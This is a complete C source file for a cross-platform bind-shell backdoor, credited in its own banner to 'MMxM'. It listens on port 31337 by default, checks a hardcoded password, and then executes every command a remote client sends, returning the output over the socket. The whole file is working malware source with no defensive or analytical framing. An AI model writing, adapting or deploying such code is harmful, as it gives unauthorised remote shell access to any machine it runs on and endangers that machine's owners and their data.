#ifdef WIN32
	#include <winsock2.h>
	#pragma comment(lib,"ws2_32.lib")
#else
	#include <unistd.h>
	#include <netinet/in.h>
	#include <sys/socket.h>
	#include <sys/types.h>
	#define SOCKET_ERROR 0xFFFFFFFF
	#define INVALID_SOCKET 0xFFFFFFFF
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PASS "p4ssw0rd" //string da senha para logar no malware

int main(int argc,char **argv){
	int port;
	(argv[1]) ? (port = atoi(argv[1])) : (port = 31337);
	printf("[+] Bind in the port %i\n",port);
	if(argc < 2){
		printf("[*] You can change this, run: %s <port-number>\n",argv[0]);
	}

	int bytes,caracter;
	char mensagem[2],buffer[1024],*message,*welcome,*ps;
	FILE *command;
	struct sockaddr_in server;

#ifdef WIN32
	welcome = "\n[+] Connected\ncmd> ";
	ps = "cmd> ";
	WSADATA wsa;
	SOCKET con;

	if(WSAStartup(MAKEWORD(2,2),&wsa) != 0){
		printf("[-] Failed. Error number : %d",WSAGetLastError());
		exit(1);
	}
#else
	welcome = "\n[+] Connected\n$ ";
	ps = "$ ";
	int con;
#endif

	printf("[+] Starting.\n");

	if((con = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET){
	#ifdef WIN32
		printf("[-] Fail to create socket, error number : %d" , WSAGetLastError());
	#else
		perror("[-] Fail to create socket");
	#endif
		exit(1);
	}

	printf("[+] Socket created\n");

#ifndef WIN32
	bzero(&server, sizeof(server));
#endif
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(port);
#ifndef WIN32
	bzero(&(server.sin_zero), 8);
#endif

	if(bind(con,(struct sockaddr *)&server , sizeof(server)) == SOCKET_ERROR){
	#ifdef WIN32
		printf("[-] Failed to bind, error number : %d" , WSAGetLastError());
	#else
		perror("[-] Failed to bind");
	#endif
		exit(1);
	}

	printf("[+] Bind Ok\n");

	listen(con , 1);

	printf("[*] Waiting connection...\n");

	while((con = accept(con,0,0))==SOCKET_ERROR);
	printf("\n[+] Connected !!!\n");

	message = "[*] Bind Backdoor by MMxM\nEnter password: ";
	send(con , message , strlen(message) , 0);

	memset(buffer,0,1024);

	recv(con,buffer,1024,0);
	buffer[strlen(buffer)-1] = '\0';
	if(strcmp(PASS,buffer) == 0){
		send(con,welcome,strlen(welcome),0);
	} else {
		#ifndef WIN32
			close(con);
		#else
			closesocket(con);
			WSACleanup();
		#endif
		exit(1);
	}

	memset(buffer,0,1024);

	while(1){
		bytes = recv(con,buffer,1024,0);
		if(bytes == -1) break;
		buffer[bytes] = '\0';

		if(strlen(buffer) > 0){
			command = popen(buffer,"r");
			while(1){
				caracter = fgetc(command);
				if(caracter == EOF) break;
					sprintf(mensagem,"%c",caracter);
					send(con,mensagem,1,0);
			}

			pclose(command);
		}

		send(con,ps,strlen(ps),0);
		memset(&buffer,0,1024);
		memset(&mensagem,0,2);
	}

	printf("[+] Disconnected\n");

	#ifdef WIN32
		closesocket(con);
		WSACleanup();
	#else
		close(con);
	#endif

	exit(0);
}
